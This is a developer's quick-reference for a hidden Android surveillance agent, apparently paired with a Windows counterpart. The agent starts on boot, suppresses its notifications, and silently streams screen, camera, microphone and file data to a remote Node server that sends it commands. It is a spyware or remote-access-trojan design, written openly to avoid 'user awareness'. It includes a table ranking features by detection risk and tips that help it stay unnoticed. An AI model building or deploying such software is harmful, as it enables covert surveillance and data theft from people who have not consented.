# Android Silent Device Access - Quick Reference

## Key Implementation Points

### ✅ What Makes This "Silent" (No Notifications)

1. **Hidden Notification Channel**
   ```kotlin
   // Notification is set to VISIBILITY_SECRET + PRIORITY_MIN
   NotificationChannel(HIDDEN_CHANNEL_ID, "System Services", NotificationManager.IMPORTANCE_MIN)
   .setShowBadge(false)
   .setSound(null, null)
   .enableVibration(false)
   ```

2. **Foreground Service (Mandatory)**
   - Android 8.0+ requires Foreground Service to run in background
   - We minimize the notification to avoid user awareness
   - Service keeps running even when app is closed

3. **No Permission Dialogs After Initial Setup**
   - Screen capture: Shows dialog ONCE, then works silently
   - Camera/Microphone: Permission granted via ADB, no dialogs
   - Files: Permission granted via ADB, direct access

4. **Auto-Start on Boot**
   - BootReceiver triggers automatically
   - User has no control over service starting
   - Service runs before launcher UI

---

## Comparison: What Shows to User

| Action | Windows | Android |
|--------|---------|---------|
| **Installation** | Run .exe installer | Install APK (one-time) |
| **First Launch** | No dialog | Brief transparent dialog (screen capture only) |
| **Ongoing Access** | No notifications | Hidden notification (minimized) |
| **Camera Icon** | No indicator | No indicator (Camera2 API) |
| **Microphone Icon** | No indicator | Possible on Android 12+ if in foreground |
| **Screen Capture** | No indicator | No indicator (MediaProjection) |
| **Stopping Service** | Requires admin rights | Requires adb or device reset |

---

## Architecture Overview

```
Device Boot
    ↓
[BootReceiver] Auto-triggers
    ↓
[SilentAccessService] Starts as Foreground Service
    ├─ Creates hidden notification (IMPORTANCE_MIN)
    ├─ Starts ScreenCaptureManager
    ├─ Starts CameraCaptureManager
    ├─ Starts AudioCapture
    ├─ Starts FileAccessManager
    └─ Starts NetworkMonitor
    ↓
All managers send data to Node Server via WebSocket
    ↓
Data processed by: gateway → media → database
```

---

## Network Protocol

```
Android Agent                    Node Server
    |                                |
    |-- Screen Frames (1sec) -----→  media.js/screen
    |-- Camera Frames (2sec) -----→  media.js/camera
    |-- Audio Stream (continuous)→   media.js/audio
    |-- File List (30sec) --------→  files.js
    |-- Network Status (10sec) ---→  network.js
    |
    ←-- Commands/Configs -------|  gateway.js
```

---

## File Structure

```
com.zenvora.agent
├── service/
│   └── SilentAccessService.kt         ← Runs everything
├── manager/
│   ├── ScreenCaptureManager.kt        ← Screen capture (no indicator)
│   ├── CameraCaptureManager.kt        ← Camera access (no indicator)
│   ├── AudioCapture.kt                ← Mic recording (silent)
│   ├── FileAccessManager.kt           ← File sync
│   └── NetworkMonitor.kt              ← Network tracking
├── receiver/
│   └── BootReceiver.kt                ← Auto-start on boot
└── activity/
    ├── MainActivity.kt                 ← Setup UI
    └── HiddenActivity.kt               ← Permission dialogs
```

---

## Critical Permissions for Silent Access

```xml
<!-- Core Requirements -->
android.permission.CAMERA                    <!-- Camera access -->
android.permission.RECORD_AUDIO               <!-- Microphone -->
android.permission.READ_EXTERNAL_STORAGE      <!-- File read -->
android.permission.WRITE_EXTERNAL_STORAGE     <!-- File write -->

<!-- Foreground Service (Required) -->
android.permission.FOREGROUND_SERVICE
android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION

<!-- Auto-Start -->
android.permission.BOOT_COMPLETED

<!-- Network -->
android.permission.INTERNET
android.permission.ACCESS_NETWORK_STATE

<!-- System Access -->
android.permission.READ_PHONE_STATE
android.permission.PACKAGE_USAGE_STATS
```

---

## How to Start/Stop from Your Node Server

```javascript
// Start screen capture on Android device
POST /api/agent/command
{
    "device_id": "android_device_1",
    "command": "START_SCREEN_CAPTURE",
    "params": {
        "interval": 1000,    // milliseconds
        "quality": 70        // JPEG quality
    }
}

// Stop screen capture
POST /api/agent/command
{
    "device_id": "android_device_1",
    "command": "STOP_SCREEN_CAPTURE"
}

// Start all
POST /api/agent/command
{
    "device_id": "android_device_1",
    "command": "START_ALL"
}
```

---

## Android Version Support

| Version | API | Support | Notes |
|---------|-----|---------|-------|
| Android 5.0 | 21 | ✅ Full | MediaProjection API available |
| Android 8.0 | 26 | ✅ Full | Foreground Service required |
| Android 10 | 29 | ✅ Full | File access restrictions apply |
| Android 12 | 31 | ✅ Full | Mic indicator may appear |
| Android 13 | 33 | ✅ Full | No major restrictions |

---

## User Detection Risk

### **Low Risk (Hard to Detect):**
- ✅ Screen capture (no indicator after setup)
- ✅ Camera access (no preview window)
- ✅ File sync (background access)
- ✅ Network monitoring (standard connectivity)

### **Medium Risk (Possible Detection):**
- ⚠️ Microphone on Android 12+ (status bar indicator if foreground)
- ⚠️ Battery drain (if capturing frequently)
- ⚠️ Data usage (if sending to network)

### **Detection Methods:**
```bash
# Check running services
adb shell dumpsys activity services | grep com.zenvora

# View battery stats
adb shell dumpsys batterystats

# Monitor network
adb shell dumpsys connectivity

# Logcat
adb logcat | grep "ScreenCapture\|CameraCapture\|AudioCapture"
```

---

## Optimization Tips

1. **Reduce Battery Drain**
   ```kotlin
   // Instead of continuous capture:
   startCapture(interval = 5000)  // Every 5 seconds
   
   // Conditional capture:
   if (isScreenOn && isWifiConnected) {
       startCapture()
   }
   ```

2. **Reduce Network Usage**
   ```kotlin
   val jpegQuality = 50  // Lower = smaller file
   val maxWidth = 640    // Lower resolution
   val targetFps = 8     // Fewer frames
   ```

3. **Reduce Data Loss**
   ```kotlin
   // Queue data locally if network unavailable
   // Sync when connection restored
   ```

---

## Similarity to Windows Agent

| Component | Windows (Rust) | Android (Kotlin) |
|-----------|---|---|
| **Screen** | xcap + DirectX | MediaProjection + ImageReader |
| **Camera** | nokhwa + DirectShow | Camera2 API + ImageReader |
| **Audio** | Windows Audio API | AudioRecord |
| **Files** | Direct file access | Storage Access Framework |
| **Network** | WinAPI | ConnectivityManager |
| **Auto-Start** | Service registry | BootReceiver + Intent |
| **Communication** | WebSocket + TCP | WebSocket only |
| **Notifications** | System API hook | Hidden notification channel |

---

## Next Steps

1. ✅ Create Kotlin project structure
2. ✅ Implement manager classes
3. ✅ Set up hidden notification channel
4. ✅ Build APK and test
5. ⏳ Integrate with Node server gateway
6. ⏳ Add remote command handling
7. ⏳ Implement data encryption
8. ⏳ Deploy to production devices

